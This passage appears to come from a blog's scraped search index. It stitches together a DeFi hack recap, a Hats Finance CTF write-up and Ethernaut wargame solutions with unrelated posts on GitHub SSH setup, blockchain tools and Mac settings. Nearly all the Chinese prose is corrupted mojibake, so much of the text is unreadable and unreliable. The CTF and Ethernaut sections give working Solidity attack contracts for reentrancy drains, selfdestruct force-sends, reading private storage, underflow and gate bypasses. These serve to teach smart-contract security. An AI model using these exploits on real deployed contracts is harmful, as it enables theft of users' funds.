https://etherscan.io/tx/0x1fe5a53405d00ce2f3e15b214c7486c69cbc5bf165cf9596e86f797f62e81914 æ”»æ“Šè€…åœ°å€ï¼š https://etherscan.io/address/0xa0959536560776ef8627da14c6e8c91e2c743a0a æ¼æ´é—œéµé»ï¼šEFVault åˆç´„å‡ç´šï¼Œstorage collision åœ¨æ–°ç‰ˆæœ¬ä¸­æ–°å¢äº†å¹¾å€‹è®Šæ•¸ï¼Œæœªè€ƒæ…®èˆŠç‰ˆæœ¬ impl çš„ storageã€‚è®€å– assetDecimal æ™‚å…¶å¯¦æ˜¯è®€åˆ°èˆŠç‰ˆæœ¬çš„ maxDepositï¼Œä»–å€‘åœ¨åŒä¸€å€‹ storage slotã€‚\næ–°ç‰ˆæœ¬ EFVault çš„ impl ä¸­çš„ initialize() ä¸èƒ½è¢«èª¿ç”¨ï¼Œå› ç‚º proxy å·²ç¶“åˆå§‹åŒ–éä¸èƒ½å†æ¬¡åˆå§‹åŒ–ï¼Œä½¿å¾—æ–°å¢çš„è®Šæ•¸ä¸èƒ½é€²è¡Œåˆå§‹åŒ–ã€‚\nğŸ¤¦â€â™‚ï¸ pic.twitter.com/5j3X95dzTe\n\u0026mdash; 3155.eth (@punk3155) March 1, 2023 setMaxDeposit æ˜¯ç”¨ä¾†è¨­å®š maxDepositï¼Œæ–°çš„å€¼è¢«è¨­ç‚ºäº† 5000000000000ï¼Œè¡¨ç¤º assetDecimal=5000000000000ï¼Œé å¤§æ–¼é æœŸçš„å€¼ã€‚\nå‡ç´šçš„åˆç´„æ–°å¢äº† redeem() å‡½æ•¸ã€‚è®€å–åˆ°çš„ storage å°è‡´ç”¨æˆ¶å¯ä»¥ç²å¾—æ¯”ä»–å€‘å¯¦éš›æ‡‰è©²ç²å¾—çš„æ›´å¤šè³‡é‡‘ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 function redeem(uint256 shares, address receiver) public virtual nonReentrant unPaused onlyAllowed returns (uint256 assets) { require(shares \u0026gt; 0, \u0026#34;ZERO_SHARES\u0026#34;); require(shares \u0026lt;= balanceOf(msg.sender), \u0026#34;EXCEED_TOTAL_BALANCE\u0026#34;); assets = (shares * assetsPerShare()) / 1e24; // HERE!!! require(assets \u0026lt;= maxWithdraw, \u0026#34;EXCEED_ONE_TIME_MAX_WITHDRAW\u0026#34;); // Withdraw asset _withdraw(assets, shares, receiver); } 1 2 3 function assetsPerShare() internal view returns (uint256) { return (IController(controller).totalAssets(false) * assetDecimal * 1e18) / totalSupply(); } åˆ©ç”¨æ­¥é©Ÿ æ”»æ“Šè€…åœ¨äº‹ä»¶ç™¼ç”Ÿå‰ 27 å¤©æœ‰èª¿ç”¨ deposit()å‘ EFVault å­˜å…¥ 0.1 ETHï¼Œç²å¾—ä¸€å®šæ•¸é‡çš„ sharesã€‚ é …ç›®æ–¹å‡ç´šåˆç´„ã€‚ å‡ç´šå¾Œæ²’éå¹¾å€‹ blockï¼Œæ”»æ“Šè€…èª¿ç”¨ redeem() ç²åˆ©ã€‚ å¾ŒçºŒ æ”»æ“Šè€…å°‡è³‡é‡‘è½‰ç§»åˆ° Tornado Cash Shata Capital è¡¨ç¤ºä»–å€‘æŒæ¡äº†æœ‰é—œæ”»æ“Šè€…èº«ä»½çš„ç·šç´¢ï¼Œä¸¦çµ¦ä»–å€‘ 24 å°æ™‚çš„æ™‚é–“ä¾†è¿”é‚„è³‡é‡‘ã€‚ï¼ˆæ‡·ç–‘æ˜¯è‡ªå·±äººï¼Œç•¢ç«Ÿæ€éº¼å¯èƒ½å‡ç´šä¹‹å¾Œé¦¬ä¸ŠçŸ¥é“è¦å±•é–‹æ”»æ“Šï¼‰ 2/ Shata Capital stated they have clues about the exploiterâ€™s identity and gave them 24 hours to return the funds for a white hat bounty. The 24 hours have now passed. pic.twitter.com/JGDEmhZWrv\n\u0026mdash; CertiK Alert (@CertiKAlert) February 28, 2023 Refernece https://twitter.com/BeosinAlert/status/1630884733671579653 https://twitter.com/peckshield/status/1630490333716029440 Jump Crypto \u0026amp; Oasis Counter Exploit å‰æƒ…æè¦ 2022 å¹´ 2 æœˆï¼Œè·¨éˆæ©‹ Wormhole é­åˆ°æ”»æ“Šï¼Œæå¤±äº† 12 è¬å€‹ ETHï¼Œç•¶æ™‚ç¸½åƒ¹å€¼ç´„ 3.25 å„„ç¾å…ƒã€‚\n2023 å¹´ 1 æœˆä»½ï¼Œæ”»æ“Šè€…åœ¨ MakerDao æ——ä¸‹çš„ Oasis ä¸Šå­˜å…¥äº† 2.18 å„„ç¾å…ƒçš„æŠµæŠ¼å“ï¼Œä¸¦é–‹è¨­äº†å…©å€‹ vaultï¼Œå¾ªç’°æŠµæŠ¼ wstETHã€rETH å€Ÿè²¸ DAI åšå¤š ETHã€‚\n2023 å¹´ 2 æœˆ 16 æ—¥ç™½å¸½è¯ç¹«äº† Oasis åœ˜éšŠï¼Œå‘å…¶æŠ«éœ²äº†ä¸€å€‹æ¼æ´ï¼Œèƒ½å¤ å°‡ä»»ä½• vault ä¸­çš„è³‡ç”¢èˆ‡å‚µå‹™è½‰ç§»ã€‚\n2023 å¹´ 2 æœˆ 21 æ—¥ï¼Œåœ¨è‹±æ ¼è˜­åŠå¨çˆ¾æ–¯é«˜ç­‰æ³•é™¢çš„å‘½ä»¤ä¸‹ï¼ŒOasis åœ˜éšŠåˆ©ç”¨å¯å‡ç´šçš„ Oasis åˆç´„ï¼Œå¾ Wormhole Exploiter çš„ vault ä¸­è½‰ç§»äº†æŠµæŠ¼å“èˆ‡å‚µå‹™ã€‚\nVault 30100 Oasis æä¾› Automation Servicesï¼ˆAutomationBot åˆç´„ï¼‰ï¼Œèƒ½å¤ å‰µå»º stop-loss trigger è‡ªå‹•å¹«ç”¨æˆ¶çš„ vault è³£æŠµæŠ¼å“é‚„è²¸æ¬¾ç­‰ã€‚\nåªè¦åœ¨ vault ä¸­åŠ å…¥ automation triggerï¼ŒAutomationBot åˆç´„å°±èƒ½ç²å¾—å° vault çš„è¨ªå•æ¬Šé™ã€‚ç„¶è€Œï¼ŒOasis åˆç´„å¯å‡ç´šã€‚\næ­·å²æ•¸æ“šï¼š https://oasis.app/30100#history åˆ©ç”¨æ­¥é©Ÿ æ”»æ“Šäº¤æ˜“ï¼š https://etherscan.io/tx/0x4f4117317a9f69915cbd060dc649c91bdc2963ea326ede46b14a2d8ef9007617 è¨­å®š upgrade delay åˆ° 0 éƒ¨ç½² Authorizer åŠ Executor åˆç´„ é€šé ServiceRegistry æ›¿æ›åˆç´„ï¼ŒMcdView -\u0026gt; Authorizerï¼ŒMcdView ç”¨ä¾†æ§åˆ¶ vault çš„ ratioï¼Œä½¿ vault å¯ä»¥è§¸ç™¼ stop-lossã€‚MultiProxyActions -\u0026gt; Executorï¼Œæ›¿æ›äº† CloseCommand delegatecall çš„ä¸€å€‹åˆç´„ï¼ˆstop-lossçš„é‚è¼¯åˆç´„ï¼‰ï¼Œä¸åŸ·è¡Œ stop-loss æ“ä½œè€Œæ˜¯å‰µå»ºä¸€å€‹æ–°çš„ vaultï¼Œå°‡æ”»æ“Šè€…çš„ vault è³‡ç”¢åŠå‚µå‹™è½‰ç§»åˆ°æ–°çš„ vaultï¼ˆCDP_MANAGER shiftæ“ä½œï¼‰ã€‚ è½‰ç§» vault çš„æ‰€æœ‰æ¬Šåˆ° Oasis Multisig é—œé–‰ vault å»ºç«‹ä¸€å€‹æ–°çš„ vault ä¸¦è½‰ç§»æŠµæŠ¼å“èˆ‡å‚µå‹™ å°‡ proxy contract å›å¾©åˆ°åŸåœ°å€ Oasis é•èƒŒäº†å»ä¸­å¿ƒåŒ–çš„ç²¾ç¥\u0026hellip; æœªä¾†æœƒä¸æœƒæœ‰æ›´å¤šé¡ä¼¼çš„äº‹æƒ…ç™¼ç”Ÿï¼Ÿ\nReference https://www.blockworksresearch.com/research/we-do-a-little-counter-exploit ","date":"2023-03-08T00:00:00Z","image":"https://i.imgur.com/JbOqEij.jpg","permalink":"https://ashirleyshe.github.io/p/2023-feb-defi-hack-recap-analysis/","title":"2023 Feb Defi Hack Recap \u0026 Analysis"},{"content":"Intro å‰é™£å­åƒåŠ äº† hats finance è¾¦çš„ ctfï¼Œæ¯”è³½å½¢å¼æ˜¯åœ¨å¹¾å¤©çš„æ™‚é–“å…§æ‰¾åˆ°åˆç´„çš„æ¼æ´ä¸¦æäº¤å ±å‘ŠåŠexpï¼Œé›–æ²’å¾—çé‚„æ˜¯ç´€éŒ„ä¸€ä¸‹ã€‚\nVault Game Repo\nVault.sol ç‚ºä¸€ ERC4626-like çš„ vaultï¼Œä»»ä½•äººå¯ä»¥å­˜ eth ä¸¦ç²å¾— sharesã€‚\nThe Challenge æœ€åˆæœƒdeposit 1 ether åˆ° vault ä¸­ã€‚\n1 2 3 4 constructor() payable ERC20(â€œVault Challenge Tokenâ€, â€œVCTâ€) { require(msg.value == 1 ether, â€œMust init the contract with 1 ethâ€); _deposit(msg.sender, address(this), msg.value); } é€šé—œç›®æ¨™ç‚ºæ¸…ç©º valut çš„ balance:\n1 2 3 4 function captureTheFlag(address newFlagHolder) external { require(address(this).balance == 0, â€œBalance is not 0â€); flagHolder = newFlagHolder; } Observation å…ˆè§€å¯Ÿä¸€ä¸€ä¸‹èƒ½è½‰å‡º ether çš„åœ°æ–¹ï¼ŒERC4626ETH.sol çš„ _withdraw()(line 148):\n1 2 3 4 5 6 uint256 excessETH = totalAssets() - totalSupply(); _burn(_owner, amount); Address.sendValue(receiver, amount); if (excessETH \u0026gt; 0) { Address.sendValue(payable(owner()), excessETH); } withdraw() è·Ÿ redeem()éƒ½æœƒé€²_withdraw()ï¼Œè€Œä¸”æ²’æœ‰ reentrancy guardã€‚\næ³¨æ„åˆ°_withdraw()ä¸­ï¼Œæœ‰å…©å€‹ sendValueï¼Œç¬¬ä¸€å€‹å‚³é€ amount ether çµ¦ receiverï¼Œç¬¬äºŒå€‹æœƒå‚³é€ excessETH çµ¦ ownerã€‚è€Œ excessETH çš„å€¼ä¸€é–‹å§‹å°±è¢«æš«å­˜ï¼Œå› æ­¤åœ¨ç¬¬ä¸€æ¬¡çš„ ether transfer é‡å…¥ withdraw()ï¼Œè¨­å®š amount = 0ï¼Œé€™æ¨£ä¾¿ä¸æœƒå½±éŸ¿åˆ° excessETHï¼Œè—‰æ­¤å¯ä»¥å¾—åˆ°é¡å¤–çš„ excessETHï¼Œæœ€çµ‚æ¸…ç©º vaultã€‚\nè¦è®“ excessETH \u0026gt; 0ï¼Œéœ€å¢åŠ totalAssets()ä½†ä¸èƒ½å‹•åˆ°totalSupply()ï¼Œå¯ä»¥é€é selfdestruct å¼·åˆ¶è½‰ç§» ether åˆ° vault åˆç´„ä¸­ã€‚\nExploit å»ºç«‹ä¸€å€‹åˆç´„è½‰å…¥ 1 ether ä¸¦èª¿ç”¨ selfdestructï¼Œæ‰€ä»¥æ­¤æ™‚ vault çš„ excessETH = 1 etherã€‚ èª¿ç”¨ withdraw()ï¼Œå°‡ amount è¨­ç‚º 0ã€‚ é‡å…¥ withdraw()ï¼ŒexcessETH = 1 ether è¢«è½‰çµ¦ ownerï¼Œæ­¤æ™‚ vault balance = 1 etherã€‚ å›åˆ°è¢«åŠ«æŒçš„ withdraw()ï¼ŒexcessETH = 1 ether å†æ¬¡è¢«è½‰çµ¦ ownerï¼Œvault balance = 0ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 pragma solidity ^0.8.0; import \u0026#34;forge-std/Test.sol\u0026#34;; import \u0026#34;../src/Vault.sol\u0026#34;; contract Destruct { constructor() payable {} function destruct(address payable target) external payable { selfdestruct(target); } } contract VaultTest is Test { Vault vault; bool flag = true; function setUp() public {} function testExp() public { vm.deal(address(this), 2 ether); Destruct destruct = new Destruct{value: 1 ether}(); vault = new Vault{value: 1 ether}(); // send unexpected ether to vault destruct.destruct(payable(address(vault))); vault.withdraw(0 ether, address(this), address(this)); console.log(\u0026#34;vault balance\u0026#34;, address(vault).balance); vault.captureTheFlag(address(this)); console.log(\u0026#34;vault.flagHolder\u0026#34;, vault.flagHolder()); } receive() external payable { if (flag) { flag = !flag; vault.withdraw(0, address(this), address(this)); } } } ","date":"2022-10-12T00:00:00Z","permalink":"https://ashirleyshe.github.io/p/hats-finance-ctf-2-writeup/","title":"Hats Finance CTF 2 WriteUp"},{"content":"é…ç½® GitHub é‡‘é‘° æµç¨‹ï¼š\nç”¢ç”Ÿ key pair åœ¨ GitHub æ”¾ public key ç”¢ç”Ÿ key pair 1 2 cd ~/.ssh ssh-keygen -t ed25519 -C \u0026#34;your_email@example.com\u0026#34; ä¸è¨­å¯†ç¢¼çš„è©±ç›´æ¥æŒ‰ enter\n1 2 3 Enter file in which to save the key (/home/username/.ssh/id_ed25519): /home/username/.ssh/github_key Enter passphrase (empty for no passphrase): Enter same passphrase again: åœ¨ GitHub æ”¾ public key è¤‡è£½å…¬é‘°æ”¾åˆ° GitHub\n1 cat id_ed25519.pub è²¼åˆ°é€™é‚Šï¼š Settings -\u0026gt; SSH and GPG keys â†’ New SSH key\né€£ç·šæ¸¬è©¦ 1 ssh -T git@github.com ~/.ssh/config 1 2 3 4 Host github.com HostName github.com User ashirleyshe IdentityFile ~/.ssh/id_rsa å¤šå€‹å¸³è™Ÿ æŸ¥çœ‹ config 1 git config --list æ”¹ config 1 2 git config user.name XXX git config user.email XXX add remote 1 git remote add origin git@niugiao:niujiao-yum/niugiao-contracr.git ","date":"2022-10-03T00:00:00Z","permalink":"https://ashirleyshe.github.io/p/github-notes/","title":"Github Notes"},{"content":"Transaction Decoder EthTx Transaction Decoder Ethereum Transaction Viewer Phalcon Tenderly blockchair Solidity Decompiler ethervm dedaub Others deth tools EthToolbox Ethereum Signature Database evm codes unix timestamp ","date":"2022-09-30T00:00:00Z","permalink":"https://ashirleyshe.github.io/p/blockchain-tools/","title":"Blockchain Tools"},{"content":"Settings ä¸‰æŒ‡æ‹–æ›³ App Homebrew iTerm2 oh my zsh Spectable vs code Tips oh my zsh git alias Env zsh: command not found: code åœ¨ vs code ä¸­ F1 -\u0026gt; \u0026gt;shell command: install 'code' command in PATH\n","date":"2022-09-26T00:00:00Z","permalink":"https://ashirleyshe.github.io/p/my-mac-settings/","title":"My Mac Settings"},{"content":"Ethernaut æ˜¯å­¸ç¿’å€å¡ŠéˆåŠ solidity éå¸¸å¥½çš„å…¥é–€å­¸ç¿’ææ–™ï¼Œä¹‹å‰æ˜¯åœ¨ Rinkeby æ¸¬è©¦ç¶²ä¸Šï¼Œä½†æ¸¬è©¦ç¶²æœƒé™¸çºŒé—œæ‰ï¼Œä¹‹å¾Œå¯ä»¥åœ¨ local éƒ¨ç½²ã€‚\né‚„æ˜¯ç´€éŒ„ä¸€ä¸‹è§£é¡ŒğŸ±\näº‹å‰æº–å‚™ Metamask Remix æ¸¬è©¦å¹£ï¼šhttps://faucet.paradigm.xyz/ Web3.js åŸºç¤ 0. Hello Ethernaut æ‰“é–‹ console(F12)ï¼Œç›®æ¨™è®“ clear = trueã€‚ è§€å¯Ÿ authenticate() éœ€å‚³å…¥ passkeyï¼Œ\n1 2 3 4 5 function authenticate(string memory passkey) public { if(keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) { cleared = true; } } password æ˜¯å€‹ public è®Šæ•¸ã€‚\n1 string public password; 1 2 await contract.password() // output: \u0026#39;ethernaut0\u0026#39; æ‹¿åˆ° password å‚³å…¥ authenticate()\n1 await contract.authenticate(\u0026#39;ethernaut0\u0026#39;) Level completed.\n1. Fallback è®“ owner = player ä¸” contract balance = 0\nè§€å¯Ÿ receive() å¯ä»¥åšåˆ°ï¼Œä½†éœ€ç¹éæ¢ä»¶ msg.value \u0026gt; 0 ä¸” contributions[msg.sender] \u0026gt; 0ã€‚\n1 2 3 4 receive() external payable { require(msg.value \u0026gt; 0 \u0026amp;\u0026amp; contributions[msg.sender] \u0026gt; 0); owner = msg.sender; } contributions[msg.sender] \u0026gt; 0 é€é contribute() é”æˆæ­¤æ¢ä»¶ 1 2 3 4 5 6 7 function contribute() public payable { require(msg.value \u0026lt; 0.001 ether); contributions[msg.sender] += msg.value; if(contributions[msg.sender] \u0026gt; contributions[owner]) { owner = msg.sender; } } é€ ether çµ¦åˆç´„é€²å…¥ receive() æ­¤æ™‚ owner = playerï¼ŒonlyOwner å¯éï¼Œèª¿ç”¨ withdraw() å¯ä»¥é ˜å…¨éƒ¨çš„éŒ¢ 1 2 3 function withdraw() public onlyOwner { owner.transfer(address(this).balance); } Exploit 1 2 3 await contract.contribute({value: toWei(\u0026#34;0.00001\u0026#34;)}); await contract.send({value: toWei(\u0026#34;0.00001\u0026#34;)}); await contract.withdraw(); ç¢ºå®š balance = 0\n1 2 await getBalance(contract.address); // output: 0 Level completed.\n2. Fallout ç›®æ¨™ owner = player\nèˆŠç‰ˆæœ¬ Solidity åˆç´„åŒåçš„å‡½æ•¸ä½œç‚º constructor\n1 2 3 4 5 /* constructor */ function Fal1out() public payable { owner = msg.sender; allocations[owner] = msg.value; } Exploit ç›´æ¥å‘¼å« Fal1out() å°±å®Œäº‹äº†\n1 await contract.Fal1out(); Level completed.\n3. Coin Flip çŒœç¡¬å¹£æ­£åé¢éŠæˆ²ï¼Œéœ€é€£çºŒçŒœå° 10 æ¬¡ï¼ˆä¸åŒ blockï¼‰i.e. consecutiveWins = 10\nç”¨ block.number ä½œç‚ºéš¨æ©Ÿæ•¸\n1 uint256 blockValue = uint256(blockhash(block.number.sub(1))); æ¯æ¬¡çŒœæ¸¬éœ€åœ¨ä¸åŒ block\n1 2 3 if (lastHash == blockValue) { revert(); } Exploit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import \u0026#39;./SafeMath.sol\u0026#39;; interface ICoinFlip { function flip(bool _guess) external returns (bool); } contract CoinFlip { uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; function guess(address levelInstance) public { uint256 blockValue = uint256(blockhash(block.number.sub(1))); uint256 coinFlip = blockValue.div(FACTOR); bool side = coinFlip == 1 ? true : false; if (side == true) { ICoinFlip(levelInstance).flip(true); } else { ICoinFlip(levelInstance).flip(false); } } } Check consecutiveWins\n1 2 await contract.consecutiveWins().then(v =\u0026gt; v.toString()) // Output: \u0026#39;10\u0026#39; Level completed.\n4. Telephone ç›®æ¨™ owner = player\näº†è§£ tx.origin èˆ‡ msg.sender çš„å·®åˆ¥ï¼š\n1 2 3 4 5 function changeOwner(address _owner) public { if (tx.origin != msg.sender) { owner = _owner; } } èˆ‰ä¾‹ï¼šA-\u0026gt;B-\u0026gt;C-\u0026gt;D Inside D: msg.sender ç‚º C (sender of the message) tx.origin ç‚º A (sender of the transaction) Exploit éƒ¨ç½²ä¸€å€‹åˆç´„å‘¼å« changeOwner() å³å¯é€šé tx.origin != msg.sender\n1 2 3 4 5 6 7 8 9 10 11 12 13 // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; interface ITelephone { function changeOwner(address _owner) external; } contract TelephoneAttack { function attack(address _addr) public { ITelephone(_addr).changeOwner(msg.sender); } } Level completed.\n5. Token ç›®æ¨™ balances[player] \u0026gt; 20ï¼Œåˆå§‹ balances[player] = 20\nè§€å¯Ÿ solidity ç‰ˆæœ¬ 0.6.0 ä¸”æ²’æœ‰ SafeMathï¼ˆ0.8.0 å¾Œè‡ªå¸¶ SafeMathï¼‰\n1 2 3 4 5 6 function transfer(address _to, uint _value) public returns (bool) { require(balances[msg.sender] - _value \u0026gt;= 0); balances[msg.sender] -= _value; balances[_to] += _value; return true; } unit256 ç¯„åœç‚º 0 åˆ° 2^256 - 1ï¼Œæ‰€ä»¥ Line 2: require ä¸€å®šæœƒé\nä»»ä½•åŠ æ³•æ¸›æ³•éƒ½å¯èƒ½æœƒ overflow/underflow\n1 20 - 21 = 2^256 - 1 æ‰€ä»¥è½‰å‡º 21 åˆ°åˆ¥çš„åœ°å€å³å¯\nExploit 1 await contract.transfer(instance, 21) Level completed.\n6. Delegation ç›®æ¨™ owner = player\næ³¨æ„åˆ° Delegate åˆç´„æœ‰å€‹ pwn() å¯ä»¥æ”¹ owner:\n1 2 3 function pwn() public { owner = msg.sender; } Delegation åˆç´„çš„ fallback() å¯ä»¥æœ‰å€‹ delegatecallï¼ˆåŸ·è¡Œå¦ä¸€å€‹åˆç´„çš„é‚è¼¯ï¼Œç‹€æ…‹æ˜¯æ”¹è®Šç¾åœ¨é€™å€‹åˆç´„ï¼‰\n1 2 3 4 5 6 fallback() external { (bool result,) = address(delegate).delegatecall(msg.data); if (result) { this; } } Exploit åˆ©ç”¨ fallback() ä¸­çš„ delegatecall èª¿ç”¨ pwn()\n1 2 signature = web3.eth.abi.encodeFunctionSignature(\u0026#34;pwn()\u0026#34;) await contract.sendTransaction({ from: player, data: signature }) Level completed.\n7. Force ç›®æ¨™è®“åˆç´„ balance \u0026gt; 0\nå¯ä»¥çœ‹åˆ°æ²’ receive æˆ– fallback\n1 2 3 4 5 6 7 8 9 10 11 12 // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Force {/* MEOW ? /\\_/\\ / ____/ o o \\ /~____ =Ã¸= / (______)__m_m) */} é€ unexpected ether æœ€ç°¡å–®çš„åšæ³•ï¼šåˆç´„ selfdestruct ä¸¦ç™¼é€ ether åˆ°æŒ‡å®šåœ°å€\nExploit è¨˜å¾—å…ˆè½‰ ether é€²å»å† selfdestruct\n1 2 3 4 5 6 7 8 9 10 11 12 // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract ForceAttack { constructor() public payable {} receive() external payable {} function attack(address payable target) public { selfdestruct(target); } } Level completed.\n8. Vault ç›®æ¨™ locked = false\npassword é›–ç„¶æ˜¯ private ä½†é‚„æ˜¯èƒ½é€éçŸ¥é“ä»–åœ¨å“ªå€‹ slot æ‹¿åˆ°ä»–çš„å€¼\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Vault { bool public locked; bytes32 private password; constructor(bytes32 _password) public { locked = true; password = _password; } function unlock(bytes32 _password) public { if (password == _password) { locked = false; } } } slot 0: bool public locked; slot 1: bytes32 private password; Exploit 1 2 password = await web3.eth.getStorageAt(contract.address, 1) await contract.unlock(password) Level completed.\n9. King ç›®æ¨™ king = player\nå¿…é ˆä»˜æ¯” prize() æ›´å¤šçš„ ether æˆç‚ºæ–°çš„ kingï¼Œæäº¤ instance æ™‚è¦é¿å… level å†åº¦æˆç‚º king\n1 2 3 4 5 6 receive() external payable { require(msg.value \u0026gt;= prize || msg.sender == owner); king.transfer(msg.value); king = msg.sender; prize = msg.value; } line 4 æœƒæ”¹è®Š kingï¼Œå› æ­¤éœ€æƒ³è¾¦æ³•åœ¨ line 3 å¡ä½\nExploit ä¸å¯« receive æˆ– fallbackï¼Œç•¶é€²åˆ° king.transfer(msg.value) æœƒæœ‰ exception\n1 2 3 4 5 6 7 8 // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract ForeverKing { function claimKingship(address payable _to) public payable { (bool sent, ) = _to.call.value(msg.value)(\u0026#34;\u0026#34;); } } Level completed.\n10. Re-entrancy ç›®æ¨™å·èµ°åˆç´„æ‰€æœ‰çš„è³‡ç”¢\nå¾ˆæ˜é¡¯é•å check-effect-interactions pattern\n1 2 3 4 5 6 7 8 9 function withdraw(uint _amount) public { if(balances[msg.sender] \u0026gt;= _amount) { (bool result,) = msg.sender.call{value:_amount}(\u0026#34;\u0026#34;); if(result) { _amount; } balances[msg.sender] -= _amount; } } Exploit donate() withdraw() é‡å…¥ withdraw()ï¼Œæ­¤æ™‚ balances[msg.sender] é‚„æ²’è¢«æ”¹è®Š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; interface IReentrance { function donate(address _to) external payable; function withdraw(uint _amount) external; } contract ReentranceAttack { IReentrance target; uint targetValue = 1000000000000000; constructor(address _targetAddr) public { target = IReentrance(_targetAddr); } function donateAndWithdraw() public payable { require(msg.value \u0026gt;= targetValue); target.donate.value(msg.value)(address(this)); target.withdraw(msg.value); } receive() external payable { uint targetBalance = address(target).balance; if (targetBalance \u0026gt;= targetValue) { target.withdraw(targetValue); } } } Level completed.\n11. Elevator ç›®æ¨™ top = true\néœ€è¦è‡ªå·±å¯¦ä½œ isLastFloor()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; interface Building { function isLastFloor(uint) external returns (bool); } contract Elevator { bool public top; uint public floor; function goTo(uint _floor) public { Building building = Building(msg.sender); if (! building.isLastFloor(_floor)) { floor = _floor; top = building.isLastFloor(floor); } } } ç¬¬ä¸€æ¬¡å‘¼å« isLastFloor() éœ€å›å‚³ false(line 15)ï¼Œç¬¬äºŒæ¬¡éœ€å›å‚³ true(line 17)\nExploit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; interface IElevator { function goTo(uint _floor) external; } contract ElevatorAttack { bool public isLast = true; function isLastFloor(uint) public returns (bool) { isLast = ! isLast; return isLast; } function attack(address _victim) public { IElevator(_victim).goTo(1); } } Level completed.\n12. Privacy ç›®æ¨™ locked = false\nå¾—çŸ¥é“ bytes16(data[2]) æ˜¯ä»€éº¼\n1 2 3 4 function unlock(bytes16 _key) public { require(_key == bytes16(data[2])); locked = false; } çœ‹ä¸€ä¸‹ storage çš„ç‹€æ³ï¼š\n1 2 3 4 5 6 slot 0: bool slot 1: ID slot 2: awkwardness | denomination | flattening slot 3: data[0] slot 4: data[1] slot 5: data[2] Exploit 1 2 3 4 5 6 key = await web3.eth.getStorageAt(contract.address, 5) // Output: \u0026#39;0x5dd89f7b81030395311dd63330c747fe293140d92dbe7eee1df2a8c233ef8d6d\u0026#39; // å– bytes16ï¼Œè¨˜å¾—åŠ ä¸Š 0xï¼Œæ‰€ä»¥æ˜¯ 34 key = key.slice(0, 34) // Output: 0x5dd89f7b81030395311dd63330c747fe await contract.unlock(key) Level completed.\n13. Gatekeeper One ç›®æ¨™ entrant = player\ngateOne åŒ 4.\n1 2 3 4 modifier gateOne() { require(msg.sender != tx.origin); _; } gateTwo gasleft å¾—è¢« 8191 æ•´é™¤\n1 2 3 4 modifier gateTwo() { require(gasleft().mod(8191) == 0); _; } å¯ä»¥æœ¬åœ°è·‘çœ‹çœ‹ä¼°ç®—å¤§æ¦‚å¤šå°‘ gasï¼Œæå€‹ for åœ¨æŸå€‹å€é–“è©¦è©¦çœ‹\n1 2 3 4 5 6 7 8 9 10 11 12 contract GateKeeperOneGasEstimate { function enterGate(address _gateAddr, uint256 _gas) public returns (bool) { bytes8 gateKey = bytes8(uint64(tx.origin)); for (unit i = _gas; i \u0026lt; _gas + 8191; i++){ (bool success, ) = address(_gateAddr).call.gas(_gas)(abi.encodeWithSignature(\u0026#34;enter(bytes8)\u0026#34;, gateKey)); if (success) { break; } } return success; } } gateThree 1 2 3 4 5 6 modifier gateThree(bytes8 _gateKey) { require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \u0026#34;GatekeeperOne: invalid gateThree part one\u0026#34;); require(uint32(uint64(_gateKey)) != uint64(_gateKey), \u0026#34;GatekeeperOne: invalid gateThree part two\u0026#34;); require(uint32(uint64(_gateKey)) == uint16(tx.origin), \u0026#34;GatekeeperOne: invalid gateThree part three\u0026#34;); _; } èˆ‰ä¾‹ player = 0xac32124edDcE61fFa17167a9c449aDc38fc8AEF4\nå…ˆçœ‹ line 4: uint32(uint64(_gateKey)) == uint16(tx.origin)\n1 2 3 4 uint32(uint64(key)) = 8f c8 AE F4 uint16(tx.origin) = AE F4 8f c8 AE F4 \u0026amp; 00 00 FF FF = 00 00 AE F4 line 3: uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)\n1 2 8f c8 AE F4 == AE F4 8f c8 AE F4 \u0026amp; 00 00 FF FF = 00 00 AE F4 line 2: uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)\n1 2 8f c8 AE F4 != c4 49 aD c3 8f c8 AE F4 c4 49 aD c3 8f c8 AE F4 \u0026amp; FF FF FF FF 00 00 FF FF = c4 49 aD c3 00 00 AE F4 Exploit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 contract Gate { function enterGate(address _gateAddr, uint256 _gas) public returns (bool) { bytes8 key = bytes8(uint64(tx.origin)) \u0026amp; 0xffffffff0000ffff; bool succeeded = false; for (uint i = _gas; i \u0026lt; _gas + 8191; i++) { (bool success, ) = address(_gateAddr).call.gas(i)(abi.encodeWithSignature(\u0026#34;enter(bytes8)\u0026#34;, key)); if (success) { succeeded = success; break; } } return succeeded; } } 14. Gatekeeper Two ç›®æ¨™ entrant = player\ngateOne åŒ 4.\ngateTwo extcodesize(a)ï¼š å–å¾—ä½æ–¼åœ°å€ a çš„ç¨‹å¼ç¢¼å¤§å°\nå°çŸ¥è­˜ï¼šåœ¨ constructor å»èª¿ç”¨æ™‚ï¼Œ extcodesize(a) æœƒå›å‚³ 0ï¼Œå› ç‚ºå°šæœªå®Œæˆéƒ¨ç½² gateThree 1 2 3 4 modifier gateThree(bytes8 _gateKey) { require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1); _; } If (X ^ Y = Z) =\u0026gt; (Y = X ^ Z)\n1 _gatekey = 